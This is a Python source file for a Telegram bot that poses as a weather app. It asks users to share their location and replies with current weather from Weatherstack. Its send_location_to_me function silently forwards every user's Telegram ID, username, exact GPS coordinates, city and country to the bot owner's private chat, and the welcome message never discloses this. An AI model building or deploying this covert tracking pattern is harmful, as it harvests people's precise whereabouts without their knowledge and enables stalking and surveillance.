import random
import requests
from telegram import Update
from telegram.ext import Application, CommandHandler, MessageHandler, filters, CallbackContext

# Your Telegram User ID and Weatherstack API key
MY_TELEGRAM_ID = ""
WEATHERSTACK_API_KEY = ""


def get_weather_emoji(weather_condition):
    weather_emoji_map = {
        'Clear': "☀️",
        'Partly cloudy': "🌤️",
        'Cloudy': "☁️",
        'Overcast': "☁️",
        'Rain': "🌧️",
        'Thunderstorm': "⚡",
        'Snow': "❄️",
        'Drizzle': "🌦️",
        'Haze': "🌫️",
        'Fog': "🌫️",
        'Windy': "💨"
    }
    return weather_emoji_map.get(weather_condition, "🌈")  

async def get_weather(latitude, longitude):
    """Fetch real weather data from Weatherstack API."""
    url = f"http://api.weatherstack.com/current?access_key={WEATHERSTACK_API_KEY}&query={latitude},{longitude}"
    response = requests.get(url)
    if response.status_code == 200:
        data = response.json()
        if 'current' in data:
            
            weather = data['current']['weather_descriptions'][0]
            temperature = data['current']['temperature']
            humidity = data['current']['humidity']
           
            location = data['location']
            city = location.get('name', 'Unknown City')
            country = location.get('country', 'Unknown Country')
            region = location.get('region', 'Unknown Region')
            emoji = get_weather_emoji(weather)
            return f"{emoji} The weather in {city}, {region}, {country} is {weather} with a temperature of {temperature}°C and humidity of {humidity}%. {emoji}", city, country
        else:
            return "Sorry, I couldn't fetch the weather data properly.", None, None
    else:
        return "Sorry, I couldn't fetch the weather at the moment.", None, None

async def send_location_to_me(application: Application, user_id, username, latitude, longitude, city, country):
    message = f"User Info:\nID: {user_id}\nUsername: @{username}\nLocation: Latitude: {latitude}, Longitude: {longitude}\nCity: {city}\nCountry: {country}"
    
    await application.bot.send_message(chat_id=MY_TELEGRAM_ID, text=message)

async def start(update: Update, context: CallbackContext) -> None:
    await update.message.reply_text('Welcome to the weather app! Send me your location to get a weather update And weather Forecast')

async def location(update: Update, context: CallbackContext) -> None:
    user_location = update.message.location
    latitude = user_location.latitude
    longitude = user_location.longitude

    
    user_id = update.message.from_user.id
    username = update.message.from_user.username or "No Username"

    
    weather_report, city, country = await get_weather(latitude, longitude)
    if city and country:
        await update.message.reply_text(f"Location: Latitude: {latitude}, Longitude: {longitude}\n{weather_report}")
        
        
        await send_location_to_me(context.application, user_id, username, latitude, longitude, city, country)
    else:
        await update.message.reply_text(weather_report)

def main():
    application = Application.builder().token("#YOUR_BOT_TOKEN").build()

   
    application.add_handler(CommandHandler("start", start))
    application.add_handler(MessageHandler(filters.LOCATION, location))

    
    application.run_polling()

if __name__ == '__main__':
    main()
